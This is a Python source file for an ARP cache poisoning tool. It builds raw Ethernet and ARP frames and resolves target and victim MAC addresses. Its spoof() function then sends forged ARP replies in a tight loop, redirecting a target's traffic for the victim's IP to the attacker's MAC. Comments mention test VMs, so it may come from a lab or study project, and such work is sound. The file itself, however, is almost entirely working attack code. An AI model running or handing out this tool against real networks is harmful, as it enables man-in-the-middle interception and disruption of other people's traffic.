# -*- encoding: utf-8 -*-
import netifaces
import socket
import struct
import binascii
import time
import sys

sys.path.append("..")
from common.ip.ip_scanner import get_interface_info
from common.struct.struct import ARPAddr, ETHAddr


def mac_str2bin(mac_str_):
    """
        convert string format mac address to binary format
        :param mac_str_: 1a:2b:3c:4d:5e:6f
        :return: b'1a2b3c4d5e6f' (binary data represented by hex str)
    """
    return binascii.unhexlify(mac_str_.replace(':', ''))


def mac_bytes2str(mac_bytes_):
    """
        convert bytes obj to mac address format string
        :param mac_bytes_: bytes obj
        :return: mack address format string
    """
    hex_str = mac_bytes_.hex()  # get hex like string from bytes: 'ffffffffffff'
    return ':'.join(hex_str[i:i + 2] for i in range(0, 12, 2))  # prettify 'ff:ff:ff:ff:ff:ff'


def eth_header_maker(eth_addr_, type_=0x0806):
    """
        create an Ethernet herder, the padding and CRC is automatically handled by NIC
        :param eth_addr_: Ethernet frame address object: ETHAddr
        :param type_: type of Ethernet data
        :return: packed Ethernet header (binary format string)
    """
    dst = mac_str2bin(eth_addr_.dest_mac)
    src = mac_str2bin(eth_addr_.src_mac)
    return struct.pack('!6s6sH', dst, src, type_)  # packet data in network byte order (big-endian)


def arp_message_maker(arp_addr_, op_):
    """
        create an ARP request or arp response message
        :param arp_addr_: ARP message address object: ARPAddr
        :param op_: 2 bytes ARP message operation code, 1: ARP Request, 2: ARP Response
        :return: packed Ethernet header (binary format string)
    """
    h_type = 0x0001  # hardware type
    p_type = 0x0800  # protocol address type, 0x0800: IPv4
    h_len = 0x06  # hardware address length
    p_len = 0x04  # protocol address length
    s_h_addr = mac_str2bin(arp_addr_.src_mac)  # sender hardware address
    s_p_addr = socket.inet_aton(arp_addr_.src_ip)  # sender protocol address  # test VM1
    t_h_addr = mac_str2bin(arp_addr_.dest_mac)
    t_p_addr = socket.inet_aton(arp_addr_.dest_ip)  # target protocol address  # test VM2
    return struct.pack("!HHBBH6s4s6s4s", h_type, p_type, h_len, p_len, op_,
                       s_h_addr, s_p_addr, t_h_addr, t_p_addr)


def arp_request(iface_, eth_addr_, arp_addr_):
    """
        make an ARP request, get the target mac address
        :param iface_: host network interface
        :param eth_addr_: Ethernet frame address object: ETHAddr
        :param arp_addr_: ARP address object: ARPAddr
        :return: target mac address
    """
    # create raw socket to send and receive ARP message
    _ETH_P_ARP = 0x0806
    raw_socket = socket.socket(socket.PF_PACKET,  # use PF_PACKET for low-level networking interface
                               socket.SOCK_RAW,  # set type to raw socket
                               socket.htons(_ETH_P_ARP))  # we are only interested in ARP packets
    raw_socket.bind((iface_, 0))  # bind interface, use reserved port number 0

    # make Eth header
    eth_header = eth_header_maker(eth_addr_)
    # make ARP Request message
    arp_req = arp_message_maker(arp_addr_, op_=0x0001)
    # combine to frame
    frame = eth_header + arp_req

    # send ARP request
    raw_socket.send(frame)
    # receive ARP response
    rx_message = raw_socket.recv(2048)

    # unpack the arp response, get the target(gateway) mac address
    raw_arp_resp = rx_message[14:42]
    arp_resp = struct.unpack("HHBBH6s4s6s4s", raw_arp_resp)

    return mac_bytes2str(arp_resp[5])  # return target mac address


def arp_response(iface_, eth_addr_, arp_addr_):
    """
        create a spoofing ARP response
        :param iface_: host network interface
        :param eth_addr_: Ethernet frame address object: ETHAddr
        :param arp_addr_: ARP address object: ARPAddr
        :return: (have not decide yet)
    """
    # create raw socket to send and receive ARP message
    _ETH_P_ARP = 0x0806
    raw_socket = socket.socket(socket.PF_PACKET,  # use PF_PACKET for low-level networking interface
                               socket.SOCK_RAW,  # set type to raw socket
                               socket.htons(_ETH_P_ARP))  # we are only interested in ARP packets
    raw_socket.bind((iface_, 0))  # bind interface, use reserved port number 0

    # make Eth header
    eth_header = eth_header_maker(eth_addr_)
    # make ARP Response message
    arp_req = arp_message_maker(arp_addr_, op_=0x0002)
    # combine to frame
    frame = eth_header + arp_req

    # send ARP request
    raw_socket.send(frame)
    return


def get_mac_addr(iface_, ip_addr_):
    """
        get mac address from given IP address
        :param iface_: interface
        :param ip_addr_: given IP address
        :return: mac address (string)
    """
    iface_info = get_interface_info(iface_)
    hacker_ip_addr = iface_info["ip_addr"]
    hacker_mac_addr = iface_info["mac_addr"]

    # get target's mac address
    eth_addr = ETHAddr(dest_mac_="ff:ff:ff:ff:ff:ff",
                       src_mac_=hacker_mac_addr)
    arp_addr = ARPAddr(src_mac_=hacker_mac_addr,
                       src_ip_=hacker_ip_addr,
                       dest_mac_="00:00:00:00:00:00",
                       dest_ip_=ip_addr_)
    mac_addr = arp_request(iface_, eth_addr, arp_addr)
    return mac_addr


def spoof(iface_, target_ip_addr_, victim_ip_addr_):
    """
        issue ARP spoofing attack
        :param iface_: interface
        :param target_ip_addr_: target IP address
        :param victim_ip_addr_: vicitm IP address
        :return: None
    """
    # get target's mac address
    target_mac_addr = get_mac_addr(iface_, target_ip_addr_)

    # get victim's mac address
    victim_mac_addr = get_mac_addr(iface_, victim_ip_addr_)

    iface_info = get_interface_info(iface_)
    hacker_mac_addr = iface_info["mac_addr"]

    # make arp spoofing response
    eth_addr = ETHAddr(dest_mac_=target_mac_addr,
                       src_mac_=victim_mac_addr)
    arp_addr = ARPAddr(src_mac_=hacker_mac_addr,
                       src_ip_=victim_ip_addr_,
                       dest_mac_=target_mac_addr,
                       dest_ip_=target_ip_addr_)
    while 1:
        try:
            arp_response(iface_, eth_addr, arp_addr)
            time.sleep(0.001)
        except KeyboardInterrupt:
            print("\nARP poisoner exit")
            exit(0)
